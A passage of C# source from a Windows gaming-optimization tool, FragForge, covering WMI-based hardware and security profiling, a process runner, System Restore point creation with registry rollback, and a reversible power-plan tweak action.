            return new DiskInfo { Model = model, SerialNumber = serial, SizeBytes = WmiValues.UInt64(r, "Size") ?? 0, Kind = kind, Bus = bus, Health = health, SmartPredictFailure = smart is null ? null : WmiValues.Bool(smart, "PredictFailure"), SmartSource = smart is null ? "MSStorageDriver_FailurePredictStatus unavailable" : "MSStorageDriver_FailurePredictStatus" };
        }).ToArray();
        var adapterRows = await Query(@"root\StandardCimv2", "MSFT_NetAdapter", ["Name", "InterfaceDescription", "DriverVersion", "DriverProvider", "MediaType", "LinkSpeed", "State", "HardwareInterface", "Virtual"]);
        var adapters = adapterRows.Select(r => new NetworkAdapterInfo { Name = WmiValues.String(r, "Name") ?? "Unknown", Description = WmiValues.String(r, "InterfaceDescription") ?? "Unknown", Kind = WmiValues.Int32(r, "MediaType") switch { 1 => NetworkKind.Ethernet, 2 => NetworkKind.WiFi, _ => (WmiValues.String(r, "InterfaceDescription") ?? "").Contains("Wi-Fi", StringComparison.OrdinalIgnoreCase) ? NetworkKind.WiFi : NetworkKind.Ethernet }, DriverVersion = WmiValues.String(r, "DriverVersion"), DriverProvider = WmiValues.String(r, "DriverProvider"), LinkSpeedBitsPerSecond = WmiValues.UInt64(r, "LinkSpeed"), IsPhysical = WmiValues.Bool(r, "HardwareInterface") == true && WmiValues.Bool(r, "Virtual") != true, State = WmiValues.String(r, "State") ?? "Unknown" }).ToArray();
        if (adapters.Length == 0)
        {
            var fallback = await Query(@"root\cimv2", "Win32_NetworkAdapter", ["Name", "NetConnectionID", "AdapterTypeId", "Speed", "PhysicalAdapter", "NetConnectionStatus"]);
            adapters = fallback.Select(r => new NetworkAdapterInfo { Name = WmiValues.String(r, "NetConnectionID") ?? WmiValues.String(r, "Name") ?? "Unknown", Description = WmiValues.String(r, "Name") ?? "Unknown", Kind = WmiValues.Int32(r, "AdapterTypeId") == 9 ? NetworkKind.WiFi : NetworkKind.Ethernet, LinkSpeedBitsPerSecond = WmiValues.UInt64(r, "Speed"), IsPhysical = WmiValues.Bool(r, "PhysicalAdapter") == true, State = WmiValues.String(r, "NetConnectionStatus") ?? "Unknown" }).ToArray();
        }
        var monitors = gpuRows.Where(r => (WmiValues.Int32(r, "CurrentHorizontalResolution") ?? 0) > 0).Select(r => new MonitorInfo { Name = WmiValues.String(r, "Name") ?? "Display", Width = WmiValues.Int32(r, "CurrentHorizontalResolution"), Height = WmiValues.Int32(r, "CurrentVerticalResolution"), RefreshRateHz = WmiValues.Int32(r, "CurrentRefreshRate"), Source = "Win32_VideoController (controlador, no enumeración exhaustiva por monitor)" }).ToArray();
        var security = await ReadSecurityAsync(Query, cancellationToken);
        var power = await ReadPowerAsync(cancellationToken);
        var enclosure = await Query(@"root\cimv2", "Win32_SystemEnclosure", ["ChassisTypes"]);
        var chassis = enclosure.SelectMany(r => WmiValues.Array(r, "ChassisTypes")).Select(x => Convert.ToInt32(x, CultureInfo.InvariantCulture)).Distinct().ToArray();
        var batteries = await Query(@"root\cimv2", "Win32_Battery", ["Name", "EstimatedChargeRemaining"]);
        var bios = (await Query(@"root\cimv2", "Win32_BIOS", ["Manufacturer", "SMBIOSBIOSVersion"])).FirstOrDefault() ?? new Dictionary<string, object?>();
        bool? portable = chassis.Length == 0 ? null : chassis.Any(t => t is 8 or 9 or 10 or 11 or 12 or 14 or 30 or 31 or 32);
        var form = new FormFactorInfo { IsPortable = portable, HasBattery = batteries.Count > 0, ChassisTypes = chassis.Select(ChassisName).ToArray(), SystemModel = WmiValues.String(cs, "Model"), BiosVersion = WmiValues.String(bios, "SMBIOSBIOSVersion") };
        var playbooks = await DetectAtlasAsync(Query, cancellationToken);
        var devices = await Query(@"root\cimv2", "Win32_PnPEntity", ["Name", "PNPDeviceID", "ConfigManagerErrorCode", "Service", "PNPClass"], "ConfigManagerErrorCode!=0 OR PNPClass='SoftwareDevice'");
        var errors = devices.Where(d => (WmiValues.Int32(d, "ConfigManagerErrorCode") ?? 0) != 0).Select(d => new DeviceErrorInfo(WmiValues.String(d, "Name") ?? "(sin nombre)", WmiValues.String(d, "PNPDeviceID") ?? "", WmiValues.Int32(d, "ConfigManagerErrorCode") ?? -1, WmiValues.String(d, "Service"))).ToArray();
        foreach (var device in devices.Where(d => (WmiValues.String(d, "PNPClass") ?? "").Equals("SoftwareDevice", StringComparison.OrdinalIgnoreCase))) observations.Add(new DiagnosticObservation("softwareDevice", WmiValues.String(device, "Name") ?? "(sin nombre)", WmiValues.String(device, "PNPDeviceID") ?? "WMI", "High", $"ConfigManagerErrorCode={WmiValues.Int32(device, "ConfigManagerErrorCode")}"));
        var maintenance = await ReadMaintenanceAsync(cancellationToken, warnings);
        var gameInfo = await games.LocateCs2Async(cancellationToken);
        var processSid = WindowsIdentity.GetCurrent().User?.Value ?? "";
        var interactiveName = WmiValues.String(cs, "UserName");
        var interactiveSid = ResolveSid(interactiveName, processSid, warnings);
        return new HardwareProfile { MachineName = Environment.MachineName, InteractiveUserName = interactiveName, InteractiveUserSid = interactiveSid, ProcessUserSid = processSid, Os = os, Cpu = cpu, Memory = memory, Gpus = gpus, Disks = disks, NetworkAdapters = adapters, Monitors = monitors, Security = security, Power = power, FormFactor = form, Playbooks = playbooks, DeviceErrors = errors, Games = gameInfo, Maintenance = maintenance, Observations = observations, ProbeWarnings = warnings };
    }
    private async Task<SecurityInfo> ReadSecurityAsync(Func<string, string, string[], string?, Task<IReadOnlyList<IReadOnlyDictionary<string, object?>>>> query, CancellationToken cancellationToken)
    {
        var guard = (await query(@"root\Microsoft\Windows\DeviceGuard", "Win32_DeviceGuard", ["VirtualizationBasedSecurityStatus", "SecurityServicesConfigured", "SecurityServicesRunning"], null)).FirstOrDefault();
        var vbs = guard is null ? FeatureState.Unknown : WmiValues.Int32(guard, "VirtualizationBasedSecurityStatus") switch { 0 => FeatureState.Disabled, 2 => FeatureState.Enabled, _ => FeatureState.Unknown };
        var running = guard is null ? [] : WmiValues.Array(guard, "SecurityServicesRunning").Select(x => Convert.ToInt32(x, CultureInfo.InvariantCulture)).ToArray();
        var configured = guard is null ? [] : WmiValues.Array(guard, "SecurityServicesConfigured").Select(x => Convert.ToInt32(x, CultureInfo.InvariantCulture)).ToArray();
        var hvci = running.Contains(2) ? FeatureState.Enabled : configured.Contains(2) ? FeatureState.Unknown : guard is not null && running.Length > 0 ? FeatureState.Disabled : FeatureState.Unknown;
        var secure = await registry.ReadValueAsync(@"HKLM\SYSTEM\CurrentControlSet\Control\SecureBoot\State", "UEFISecureBootEnabled", cancellationToken);
        var secureState = secure.ValueExists ? Convert.ToInt32(secure.Data, CultureInfo.InvariantCulture) == 1 ? FeatureState.Enabled : FeatureState.Disabled : FeatureState.Unknown;
        if (secureState == FeatureState.Unknown)
        {
            try
            {
                var result = await runner.RunAsync(new ProcessRequest { FileName = ProcessRunner.SystemExecutable(@"WindowsPowerShell\v1.0\powershell.exe"), Arguments = ["-NoProfile", "-NonInteractive", "-Command", "try { if (Confirm-SecureBootUEFI) { 'Enabled' } else { 'Disabled' } } catch { 'Unknown' }"], Timeout = TimeSpan.FromSeconds(20) }, cancellationToken);
                secureState = result.StandardOutput.Trim() switch { "Enabled" => FeatureState.Enabled, "Disabled" => FeatureState.Disabled, _ => FeatureState.Unknown };
            }
            catch (Exception ex) when (ex is not OperationCanceledException) { secureState = FeatureState.Unknown; }
        }
        var tpmRows = await query(@"root\Microsoft\Windows\TPM", "Win32_Tpm", ["IsEnabled_InitialValue", "IsActivated_InitialValue", "SpecVersion"], null);
        var tpm = tpmRows.FirstOrDefault();
        var tpmState = tpm is null ? FeatureState.NotPresent : WmiValues.Bool(tpm, "IsEnabled_InitialValue") == true && WmiValues.Bool(tpm, "IsActivated_InitialValue") == true ? FeatureState.Enabled : FeatureState.Disabled;
        var hags = await registry.ReadValueAsync(@"HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers", "HwSchMode", cancellationToken);
        var mpo = await registry.ReadValueAsync(@"HKLM\SOFTWARE\Microsoft\Windows\Dwm", "OverlayTestMode", cancellationToken);
        return new SecurityInfo { Vbs = vbs, Hvci = hvci, SecureBoot = secureState, Tpm = tpmState, TpmVersion = tpm is null ? null : WmiValues.String(tpm, "SpecVersion"), Hags = hags.ValueExists ? Convert.ToInt32(hags.Data) == 2 ? FeatureState.Enabled : Convert.ToInt32(hags.Data) == 1 ? FeatureState.Disabled : FeatureState.Unknown : FeatureState.Unknown, Mpo = mpo.ValueExists && Convert.ToInt32(mpo.Data) == 5 ? FeatureState.Disabled : FeatureState.Unknown, Evidence = "WMI DeviceGuard/TPM, registro SecureBoot/HAGS/MPO; Unknown no se interpreta como Disabled." };
    }
    private async Task<PowerInfo> ReadPowerAsync(CancellationToken cancellationToken)
    {
        try
        {
            var result = await runner.RunAsync(new ProcessRequest { FileName = ProcessRunner.SystemExecutable("powercfg.exe"), Arguments = ["/getactivescheme"], Timeout = TimeSpan.FromSeconds(20) }, cancellationToken);
            if (!result.IsSuccess) return new PowerInfo();
            var match = Regex.Match(result.StandardOutput, @"([0-9a-fA-F-]{36})\s+\(([^)]*)\)");
            return new PowerInfo { ActiveSchemeGuid = match.Success ? match.Groups[1].Value.ToLowerInvariant() : null, ActiveSchemeName = match.Success ? match.Groups[2].Value : null };
        }
        catch (Exception ex) when (ex is not OperationCanceledException) { return new PowerInfo { PowerLimitSource = "powercfg failed: " + ex.Message }; }
    }
    private async Task<IReadOnlyList<PlaybookDetection>> DetectAtlasAsync(Func<string, string, string[], string?, Task<IReadOnlyList<IReadOnlyDictionary<string, object?>>>> query, CancellationToken cancellationToken)
    {
        var evidence = new List<string>();
        foreach (var name in new[] { "RegisteredOrganization", "Organization" })
        {
            var value = await registry.ReadValueAsync(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion", name, cancellationToken);
            if (value.ValueExists && (value.Data as string ?? "").Contains("Atlas", StringComparison.OrdinalIgnoreCase)) evidence.Add($"{name}={value.Data}");
        }
        if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Atlas"))) evidence.Add("ProgramDataAtlas folder");
        var services = await query(@"root\cimv2", "Win32_Service", ["Name", "State", "StartMode"], "Name='SysMain' OR Name='WSearch' OR Name='Spooler' OR Name='DiagTrack'");
        var stopped = services.Where(s => WmiValues.String(s, "State") != "Running").Select(s => WmiValues.String(s, "Name") ?? "").ToArray();
        if (stopped.Length > 0) evidence.Add("Servicios no corriendo (no concluyente): " + string.Join(",", stopped));
        return evidence.Count == 0 ? [] : [new PlaybookDetection("Atlas Playbook (heurística)", evidence.Any(e => e.StartsWith("RegisteredOrganization") || e.StartsWith("Organization")) ? "Medium" : "Low", evidence)];
    }
    private async Task<SystemMaintenanceInfo> ReadMaintenanceAsync(CancellationToken cancellationToken, List<string> warnings)
    {
        var reasons = new List<string>();
        if (await registry.KeyExistsAsync(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending", cancellationToken)) reasons.Add("CBS RebootPending");
        if (await registry.KeyExistsAsync(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired", cancellationToken)) reasons.Add("WindowsUpdate RebootRequired");
        var pending = await registry.ReadValueAsync(@"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager", "PendingFileRenameOperations", cancellationToken);
        if (pending.ValueExists && pending.Data is string[] { Length: > 0 }) reasons.Add("PendingFileRenameOperations");
        var activeName = await registry.ReadValueAsync(@"HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName", "ComputerName", cancellationToken);
        var pendingName = await registry.ReadValueAsync(@"HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName", "ComputerName", cancellationToken);
        if (activeName.ValueExists && pendingName.ValueExists && !string.Equals(activeName.Data as string, pendingName.Data as string, StringComparison.OrdinalIgnoreCase)) reasons.Add("ComputerName change pending");
        var servicing = new List<string>();
        foreach (var name in new[] { "TiWorker", "TrustedInstaller" }) { try { if (System.Diagnostics.Process.GetProcessesByName(name).Length > 0) servicing.Add(name); } catch (Exception ex) when (ex is not OperationCanceledException) { warnings.Add($"Process {name}: {ex.Message}"); } }
        var systemRoot = Path.GetPathRoot(Environment.SystemDirectory) ?? "C:\\";
        ulong free = 0; try { free = (ulong)new DriveInfo(systemRoot).AvailableFreeSpace; } catch (Exception ex) { warnings.Add("Disk free space: " + ex.Message); }
        var admin = false; try { using var identity = WindowsIdentity.GetCurrent(); admin = new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator); } catch (Exception ex) { warnings.Add("Administrator check: " + ex.Message); }
        FeatureState protection; try { protection = await restore.GetProtectionStateAsync(cancellationToken); } catch (Exception ex) when (ex is not OperationCanceledException) { protection = FeatureState.Unknown; warnings.Add("System protection: " + ex.Message); }
        return new SystemMaintenanceInfo { PendingReboot = reasons.Count > 0, PendingRebootReasons = reasons, WindowsServicingActive = servicing.Count > 0, ServicingProcesses = servicing, SystemProtection = protection, IsAdministrator = admin, SystemDriveFreeBytes = free };
    }
    private static string? ResolveSid(string? userName, string processSid, List<string> warnings)
    {
        if (string.IsNullOrWhiteSpace(userName)) return null;
        try
        {
            using var current = WindowsIdentity.GetCurrent();
            if (string.Equals(current.Name, userName, StringComparison.OrdinalIgnoreCase)) return processSid;
            return new NTAccount(userName).Translate(typeof(SecurityIdentifier)).Value;
        }
        catch (Exception ex) when (ex is not OperationCanceledException) { warnings.Add("Interactive user SID: " + ex.Message); return null; }
    }
    private static string BusName(int? bus) => bus switch { 3 => "ATA", 7 => "USB", 10 => "SAS", 11 => "SATA", 17 => "NVMe", 18 => "SCM", _ => "Unknown" };
    private static string ChassisName(int type) => type switch { 3 => "Desktop", 4 => "LowProfileDesktop", 8 => "Portable", 9 => "Laptop", 10 => "Notebook", 30 => "Tablet", 31 => "Convertible", 32 => "Detachable", 35 => "MiniPC", _ => $"Type{type}" };
}

public sealed class UnsupportedHardwareProfiler : IHardwareProfiler
{
    public Task<HardwareProfile> ProfileAsync(CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null) => Task.FromResult(new HardwareProfile
    {
        IsUnsupportedPlatform = true,
        Os = new OsInfo { Name = Environment.OSVersion.ToString(), Architecture = RuntimeInformation.OSArchitecture.ToString(), Culture = CultureInfo.CurrentCulture.Name, TimeZone = TimeZoneInfo.Local.Id },
        Cpu = new CpuInfo { Model = RuntimeInformation.ProcessArchitecture.ToString(), LogicalProcessors = Environment.ProcessorCount, IsHybrid = null, TopologySource = "Unsupported platform" },
        ProbeWarnings = ["Esta plataforma no es Windows. El perfil es parcial y las acciones reales están bloqueadas."]
    });
}
````

### `src/FragForge.Actions/Platform/ProcessRunner.cs`  <sub>(52 líneas)</sub>

````csharp
using System.Diagnostics;
using System.Text;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Platform;

public sealed class ProcessRunner : IProcessRunner
{
    public async Task<ProcessResult> RunAsync(ProcessRequest request, CancellationToken cancellationToken = default)
    {
        if (request.Timeout <= TimeSpan.Zero || request.Timeout > TimeSpan.FromMinutes(30)) throw new ArgumentOutOfRangeException(nameof(request), "Process timeout must be between 0 and 30 minutes.");
        var start = new ProcessStartInfo
        {
            FileName = request.FileName,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            RedirectStandardInput = request.StandardInput is not null,
            StandardOutputEncoding = Encoding.UTF8,
            StandardErrorEncoding = Encoding.UTF8,
            WorkingDirectory = request.WorkingDirectory ?? Environment.CurrentDirectory
        };
        foreach (var argument in request.Arguments) start.ArgumentList.Add(argument);
        using var process = new Process { StartInfo = start };
        process.Start();
        var stdout = process.StandardOutput.ReadToEndAsync(cancellationToken);
        var stderr = process.StandardError.ReadToEndAsync(cancellationToken);
        if (request.StandardInput is not null)
        {
            await process.StandardInput.WriteAsync(request.StandardInput.AsMemory(), cancellationToken);
            process.StandardInput.Close();
        }
        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        timeout.CancelAfter(request.Timeout);
        var timedOut = false;
        try { await process.WaitForExitAsync(timeout.Token); }
        catch (OperationCanceledException)
        {
            timedOut = !cancellationToken.IsCancellationRequested;
            try { process.Kill(true); } catch (InvalidOperationException) { }
            await process.WaitForExitAsync(CancellationToken.None);
            if (!timedOut) throw;
        }
        var output = await stdout.WaitAsync(CancellationToken.None);
        var error = await stderr.WaitAsync(CancellationToken.None);
        if (timedOut) return new ProcessResult(-1, output, error, true);
        return new ProcessResult(process.ExitCode, output, error, false);
    }
    public static string SystemExecutable(string name) => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), name);
}
````

### `src/FragForge.Actions/Platform/SystemRestoreService.cs`  <sub>(84 líneas)</sub>

````csharp
using System.Management;
using System.Runtime.Versioning;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Actions.Registry;

namespace FragForge.Actions.Platform;

[SupportedOSPlatform("windows")]
public sealed class SystemRestoreService(IWmiQuery wmi, IRegistry registry, IProcessRunner runner) : ISystemRestoreService
{
    private const string Key = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore";
    private const string ValueName = "SystemRestorePointCreationFrequency";
    public async Task<FeatureState> GetProtectionStateAsync(CancellationToken cancellationToken = default)
    {
        try
        {
            var systemDrive = (Path.GetPathRoot(Environment.SystemDirectory) ?? "C:\\").TrimEnd('\\');
            var volumes = await wmi.QueryAsync(@"root\cimv2", "Win32_Volume", ["DeviceID", "DriveLetter"], $"DriveLetter='{systemDrive}'", cancellationToken);
            var device = volumes.FirstOrDefault()?["DeviceID"] as string;
            if (device is null) return FeatureState.Unknown;
            var storage = await wmi.QueryAsync(@"root\cimv2", "Win32_ShadowStorage", ["Volume", "DiffVolume", "AllocatedSpace", "MaximumSpace"], null, cancellationToken);
            return storage.Any(s => (s["Volume"] as string ?? s["DiffVolume"] as string ?? "").Contains(device, StringComparison.OrdinalIgnoreCase)) ? FeatureState.Enabled : FeatureState.Disabled;
        }
        catch (Exception ex) when (ex is ManagementException or InvalidOperationException or IOException) { return FeatureState.Unknown; }
    }
    public async Task EnableProtectionAsync(CancellationToken cancellationToken = default)
    {
        var drive = Path.GetPathRoot(Environment.SystemDirectory) ?? "C:\\";
        var script = $"$ErrorActionPreference='Stop'; Enable-ComputerRestore -Drive '{drive.Replace("'", "''")}' -Confirm:$false";
        var result = await runner.RunAsync(new ProcessRequest { FileName = ProcessRunner.SystemExecutable(@"WindowsPowerShell\v1.0\powershell.exe"), Arguments = ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script], Timeout = TimeSpan.FromMinutes(2) }, cancellationToken);
        if (!result.IsSuccess) throw new ProcessFailedException("Enable-ComputerRestore", result.ExitCode, result.TimedOut ? "timeout" : result.StandardError);
    }
    public async Task<RestorePointResult> CreateAsync(string description, CancellationToken cancellationToken = default)
    {
        if (description.Length > 256) throw new ArgumentException("Restore point description is limited to 256 characters.", nameof(description));
        var original = await registry.ReadValueAsync(Key, ValueName, cancellationToken);
        var missing = new List<string>();
        foreach (var ancestor in RegistryPath.AncestorsFromRoot(Key)) if (!await registry.KeyExistsAsync(ancestor, cancellationToken)) missing.Add(ancestor);
        var capture = RegistryValueConverter.Capture(Key, ValueName, original, missing);
        await registry.WriteValueAsync(Key, ValueName, new RegistryWriteValue("DWord", 0), cancellationToken);
        try
        {
            cancellationToken.ThrowIfCancellationRequested();
            var result = await Task.Run(() =>
            {
                using var cls = new ManagementClass(@"root\default:SystemRestore");
                using var input = cls.GetMethodParameters("CreateRestorePoint");
                input["Description"] = description;
                input["RestorePointType"] = 12u;
                input["EventType"] = 100u;
                using var output = cls.InvokeMethod("CreateRestorePoint", input, null);
                return Convert.ToUInt32(output["ReturnValue"]);
            }, CancellationToken.None);
            cancellationToken.ThrowIfCancellationRequested();
            if (result != 0) throw new FragForgeException("restore_point_failed", $"SystemRestore.CreateRestorePoint devolvió {result}. No se aplicarán cambios.");
            long? sequence = null;
            try
            {
                var points = await wmi.QueryAsync(@"root\default", "SystemRestore", ["Description", "SequenceNumber"], null, CancellationToken.None);
                var point = points.Where(p => (p["Description"] as string) == description).OrderByDescending(p => Convert.ToInt64(p["SequenceNumber"] ?? 0L)).FirstOrDefault();
                if (point is not null) sequence = Convert.ToInt64(point["SequenceNumber"]);
            }
            catch (ManagementException) { }
            return new RestorePointResult(sequence, sequence is null ? "Punto creado; WMI no expuso su número de secuencia." : $"Punto de restauración {sequence} creado.");
        }
        finally
        {
            try
            {
                if (capture.ValueExisted) await registry.WriteValueAsync(Key, ValueName, RegistryValueConverter.ToWriteValue(capture), CancellationToken.None);
                else await registry.DeleteValueAsync(Key, ValueName, CancellationToken.None);
                foreach (var ancestor in capture.MissingAncestors)
                {
                    var parent = ancestor[..ancestor.LastIndexOf('\\')];
                    var child = ancestor[(ancestor.LastIndexOf('\\') + 1)..];
                    await registry.DeleteEmptySubKeyAsync(parent, child, CancellationToken.None);
                }
            }
            catch (Exception ex) when (ex is not OutOfMemoryException) { throw new RollbackException("No se pudo restaurar SystemRestorePointCreationFrequency tras crear el punto.", ex); }
        }
    }
}
````

### `src/FragForge.Actions/Platform/WmiQuery.cs`  <sub>(42 líneas)</sub>

````csharp
using System.Management;
using System.Runtime.Versioning;
using FragForge.Core.Abstractions;

namespace FragForge.Actions.Platform;

[SupportedOSPlatform("windows")]
public sealed class WmiQuery : IWmiQuery
{
    public Task<IReadOnlyList<IReadOnlyDictionary<string, object?>>> QueryAsync(string scope, string className, IReadOnlyList<string> properties, string? where = null, CancellationToken cancellationToken = default) => Task.Run(() =>
    {
        cancellationToken.ThrowIfCancellationRequested();
        if (!System.Text.RegularExpressions.Regex.IsMatch(className, "^[A-Za-z_][A-Za-z0-9_]*$") || properties.Any(p => !System.Text.RegularExpressions.Regex.IsMatch(p, "^[A-Za-z_][A-Za-z0-9_]*$"))) throw new ArgumentException("Invalid WMI identifier.");
        var query = "SELECT " + (properties.Count == 0 ? "*" : string.Join(",", properties)) + " FROM " + className + (where is null ? "" : " WHERE " + where);
        using var searcher = new ManagementObjectSearcher(new ManagementScope(scope), new ObjectQuery(query), new System.Management.EnumerationOptions { Timeout = TimeSpan.FromSeconds(15), ReturnImmediately = false });
        using var collection = searcher.Get();
        var rows = new List<IReadOnlyDictionary<string, object?>>();
        foreach (var item in collection)
        {
            using var managementObject = (ManagementBaseObject)item;
            var row = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase);
            foreach (var property in properties.Count == 0 ? managementObject.Properties.Cast<PropertyData>().Select(p => p.Name) : properties)
            {
                try { row[property] = Normalize(managementObject[property]); }
                catch (ManagementException) { row[property] = null; }
            }
            rows.Add(row);
            cancellationToken.ThrowIfCancellationRequested();
        }
        return (IReadOnlyList<IReadOnlyDictionary<string, object?>>)rows;
    }, cancellationToken);
    private static object? Normalize(object? value) => value switch
    {
        string[] strings => strings.ToArray(),
        ushort[] numbers => numbers.ToArray(),
        uint[] numbers => numbers.ToArray(),
        ulong[] numbers => numbers.ToArray(),
        bool[] values => values.ToArray(),
        ManagementBaseObject embedded => embedded.ToString(),
        _ => value
    };
}
````

### `src/FragForge.Actions/Power/PowerPlanAction.cs`  <sub>(176 líneas)</sub>

````csharp
using System.Globalization;
using System.Text.RegularExpressions;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Power;

public sealed class PowerPlanAction : ITweakAction
{
    private readonly IProcessRunner _runner;
    private readonly PowerPlanParameters _parameters;
    public string Kind => "PowerPlan";
    public PowerPlanAction(IProcessRunner runner, ActionSpec specification)
    {
        _runner = runner;
        _parameters = ActionParameters.Parse<PowerPlanParameters>(specification);
        Validate();
    }
    private Task<ProcessResult> RunPowerCfgAsync(IReadOnlyList<string> args, CancellationToken token) => _runner.RunAsync(new ProcessRequest { FileName = Platform.ProcessRunner.SystemExecutable("powercfg.exe"), Arguments = args, Timeout = TimeSpan.FromSeconds(60) }, token);
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        Validate();
        return Task.CompletedTask;
    }
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        Validate();
        var active = await GetActivePlanAsync(cancellationToken);
        var plans = await ListPlansAsync(cancellationToken);
        var existing = FindPlan(plans);
        var settings = new List<PowerSettingCapture>();
        string? export = null;
        if (existing is not null)
        {
            foreach (var setting in _parameters.Settings) settings.Add(await QuerySettingAsync(existing.Value.Guid, setting.SubgroupGuid, setting.SettingGuid, cancellationToken));
            if (context.ArtifactDirectory is not null)
            {
                export = $"power-{existing.Value.Guid}.pow";
                await RunAsync(["/export", Path.Combine(context.ArtifactDirectory, export), existing.Value.Guid], cancellationToken);
            }
        }
        return new PowerPlanActionState { PlanName = _parameters.PlanName, PreviousActiveGuid = active, PlanExisted = existing is not null, Settings = settings, ExportArtifact = export };
    }
    public async Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (PowerPlanActionState)before;
        var plans = await ListPlansAsync(cancellationToken);
        var guid = FindPlan(plans)?.Guid;
        if (guid is null)
        {
            if (state.PlanExisted) throw new VerificationFailedException("El plan preexistente desapareció antes de aplicar.");
            var result = await RunAsync(["/duplicatescheme", _parameters.SourceSchemeGuid], cancellationToken);
            guid = ParseGuid(result, "duplicated power scheme");
        }
        foreach (var setting in _parameters.Settings)
        {
            await RunAsync(["/setacvalueindex", guid, setting.SubgroupGuid, setting.SettingGuid, setting.AcValue.ToString(CultureInfo.InvariantCulture)], cancellationToken);
            await RunAsync(["/setdcvalueindex", guid, setting.SubgroupGuid, setting.SettingGuid, setting.DcValue.ToString(CultureInfo.InvariantCulture)], cancellationToken);
        }
        var active = await GetActivePlanAsync(cancellationToken);
        if (_parameters.Activate || string.Equals(active, guid, StringComparison.OrdinalIgnoreCase)) await RunAsync(["/setactive", guid], cancellationToken);
        context.Report("apply", 1, $"Plan '{_parameters.PlanName}' configurado ({guid}).");
    }
    public async Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var plan = FindPlan(await ListPlansAsync(cancellationToken));
        if (plan is null) return VerificationResult.Missing("El plan FragForge no existe.");
        foreach (var setting in _parameters.Settings)
        {
            var current = await QuerySettingAsync(plan.Value.Guid, setting.SubgroupGuid, setting.SettingGuid, cancellationToken);
            if (current.AcIndex != setting.AcValue || current.DcIndex != setting.DcValue) return VerificationResult.Missing($"El ajuste {setting.SettingGuid} no coincide.");
        }
        if (_parameters.Activate)
        {
            var active = await GetActivePlanAsync(cancellationToken);
            if (!string.Equals(active, plan.Value.Guid, StringComparison.OrdinalIgnoreCase)) return VerificationResult.Missing("El plan FragForge no está activo.");
        }
        return VerificationResult.Match($"Plan '{_parameters.PlanName}' y ajustes verificados.");
    }
    public async Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (PowerPlanActionState)before;
        if (string.IsNullOrWhiteSpace(state.PreviousActiveGuid)) throw new InvalidDataException("El snapshot no contiene el plan activo previo.");
        await RunAsync(["/setactive", state.PreviousActiveGuid], cancellationToken);
        var plan = FindPlan(await ListPlansAsync(cancellationToken));
        if (state.PlanExisted)
        {
            if (plan is null) throw new VerificationFailedException("El plan preexistente ya no existe.");
            foreach (var setting in state.Settings)
            {
                await RunAsync(["/setacvalueindex", plan.Value.Guid, setting.SubgroupGuid, setting.SettingGuid, setting.AcIndex.ToString(CultureInfo.InvariantCulture)], cancellationToken);
                await RunAsync(["/setdcvalueindex", plan.Value.Guid, setting.SubgroupGuid, setting.SettingGuid, setting.DcIndex.ToString(CultureInfo.InvariantCulture)], cancellationToken);
            }
            await RunAsync(["/setactive", state.PreviousActiveGuid], cancellationToken);
        }
        else if (plan is not null) await RunAsync(["/delete", plan.Value.Guid], cancellationToken);
        context.Report("revert", 1, "Plan anterior reactivado; solo se elimina el plan creado por FragForge.");
    }
    public async Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (PowerPlanActionState)before;
        var active = await GetActivePlanAsync(cancellationToken);
        if (!string.Equals(active, state.PreviousActiveGuid, StringComparison.OrdinalIgnoreCase)) return VerificationResult.Missing("El plan activo previo no fue restaurado.");
        var plan = FindPlan(await ListPlansAsync(cancellationToken));
        if (!state.PlanExisted) return plan is null ? VerificationResult.Match("Plan creado eliminado y plan previo activo.") : VerificationResult.Missing("El plan creado no fue eliminado.");
        if (plan is null) return VerificationResult.Missing("El plan preexistente fue eliminado incorrectamente.");
        foreach (var setting in state.Settings)
        {
            var current = await QuerySettingAsync(plan.Value.Guid, setting.SubgroupGuid, setting.SettingGuid, cancellationToken);
            if (current != setting) return VerificationResult.Missing("Los ajustes AC/DC previos no fueron restaurados.");
        }
        return VerificationResult.Match("Plan preexistente restaurado sin eliminarlo.");
    }
    public async Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var existing = FindPlan(await ListPlansAsync(cancellationToken));
        var action = existing is null ? $"Duplicar esquema {_parameters.SourceSchemeGuid} como '{_parameters.PlanName}'" : $"Actualizar el plan existente '{_parameters.PlanName}' sin eliminarlo";
        var settings = string.Join(", ", _parameters.Settings.Select(s => $"{s.SettingGuid} AC={s.AcValue} DC={s.DcValue}"));
        return $"{action}; {settings}; activar={_parameters.Activate}. Revert reactiva el plan anterior y elimina solo el plan nuevo, o restaura los ajustes previos si ya existía.";
    }
    private void Validate()
    {
